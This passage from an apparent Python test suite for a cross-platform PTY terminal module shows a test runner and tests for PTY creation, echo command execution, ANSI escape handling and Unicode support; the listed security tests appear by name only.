                details=result if isinstance(result, dict) else None
            )
            
            test_logger.info(f"✅ {test_name} PASSED ({execution_time:.3f}s)")
            
        except Exception as e:
            execution_time = time.time() - start_time
            test_result = TestResult(
                test_name=test_name,
                passed=False,
                execution_time=execution_time,
                error_message=str(e)
            )
            
            test_logger.error(f"❌ {test_name} FAILED: {e}")
        
        self.test_results.append(test_result)
        return test_result
    
    def run_all_tests(self) -> Dict[str, Any]:
        """Run comprehensive test suite"""
        test_logger.info("Starting comprehensive test suite")
        
        # Core functionality tests
        self.run_test("PTY Creation", self.test_pty_creation)
        self.run_test("Command Execution", self.test_command_execution)
        self.run_test("ANSI Processing", self.test_ansi_processing)
        self.run_test("Unicode Support", self.test_unicode_support)
        self.run_test("Signal Handling", self.test_signal_handling)
        self.run_test("Environment Variables", self.test_environment_variables)
        
        # Security tests
        self.run_test("Security Validation", self.test_security_validation)
        self.run_test("Command Injection Prevention", self.test_command_injection)
        self.run_test("Path Traversal Prevention", self.test_path_traversal)
        self.run_test("Resource Limits", self.test_resource_limits)
        
        # Performance tests
        self.run_test("Memory Usage", self.test_memory_usage)
        self.run_test("CPU Usage", self.test_cpu_usage)
        self.run_test("I/O Performance", self.test_io_performance)
        self.run_test("Concurrent Execution", self.test_concurrent_execution)
        
        # Platform compatibility tests
        self.run_test("Cross-Platform Commands", self.test_cross_platform_commands)
        self.run_test("Working Directory", self.test_working_directory)
        self.run_test("Exit Code Propagation", self.test_exit_codes)
        
        # UI and integration tests
        self.run_test("Terminal Resize", self.test_terminal_resize)
        self.run_test("History Management", self.test_history_management)
        self.run_test("Configuration Loading", self.test_configuration_loading)
        
        # Generate test report
        return self.generate_test_report()
    
    def test_pty_creation(self) -> Dict[str, Any]:
        """Test PTY creation and basic functionality"""
        if sys.platform == 'win32':
            # Test Windows ConPTY/winpty
            try:
                import winpty
                process = winpty.PtyProcess.spawn('cmd /c echo Windows PTY Test')
                output = process.read()
                process.wait()
                
                assert "Windows PTY Test" in output.decode('utf-8', errors='ignore')
                return {"platform": "windows", "pty_type": "winpty", "output_length": len(output)}
                
            except ImportError:
                raise RuntimeError("winpty not available on Windows")
        else:
            # Test Unix PTY
            import pty
            master_fd, slave_fd = pty.openpty()
            
            # Test TTY detection
            assert os.isatty(slave_fd), "PTY slave should be detected as TTY"
            
            # Test basic I/O
            os.write(master_fd, b"test\n")
            data = os.read(master_fd, 1024)
            
            os.close(master_fd)
            os.close(slave_fd)
            
            return {"platform": "unix", "pty_type": "pty", "tty_detected": True}
    
    def test_command_execution(self) -> Dict[str, Any]:
        """Test basic command execution"""
        if sys.platform == 'win32':
            cmd = 'echo "Command execution test"'
            expected = "Command execution test"
        else:
            cmd = 'echo "Command execution test"'
            expected = "Command execution test"
        
        # Execute command and capture output
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True,
            cwd=self.test_dir
        )
        
        assert result.returncode == 0, f"Command failed with return code {result.returncode}"
        assert expected in result.stdout, f"Expected output not found: {result.stdout}"
        
        return {
            "return_code": result.returncode,
            "stdout_length": len(result.stdout),
            "stderr_length": len(result.stderr)
        }
    
    def test_ansi_processing(self) -> Dict[str, Any]:
        """Test ANSI escape sequence processing"""
        # Test ANSI color sequences
        test_cases = [
            ("Hello\rWorld", "World"),  # Carriage return overwrite
            ("AB\b\bCD", "CD"),  # Backspace handling
            ("\x1b[31mRed\x1b[0m", "Red"),  # Color codes (should be stripped)
            ("Line1\x1b[KLine2", "Line1Line2"),  # Clear to end of line
        ]
        
        from enhanced_pty_terminal import ANSIProcessor  # Import from our main module
        processor = ANSIProcessor()
        
        results = {}
        for input_text, expected in test_cases:
            processed = processor.process_ansi(input_text)
            results[input_text[:10]] = {
                "input": input_text,
                "expected": expected,
                "processed": processed,
                "matches": expected in processed
            }
            
            # Some processing might not be exact matches, just verify key behavior
            if input_text == "Hello\rWorld":
                assert processed == "World", f"CR overwrite failed: got '{processed}'"
        
        return results
    
    def test_unicode_support(self) -> Dict[str, Any]:
        """Test Unicode and international character support"""
        unicode_tests = [
            "π≈3.14",  # Mathematical symbols
            "🚀 Rocket",  # Emojis
            "中文测试",  # Chinese characters
            "العربية",  # Arabic text
            "Ελληνικά",  # Greek text
            "русский",  # Russian text
        ]
        
        results = {}
        